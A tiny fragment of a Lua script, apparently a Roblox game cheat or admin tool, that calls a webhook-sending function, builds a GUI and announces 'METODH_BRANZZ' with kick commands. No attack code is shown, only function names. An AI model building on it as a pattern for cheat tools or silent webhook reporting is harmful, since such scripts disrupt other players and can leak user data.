    sendInitialWebhook()
    createMainGUI()
    print("✅ METODH_BRANZZ ativo! Comandos: kick/:kick/;kick | abrir")
end)
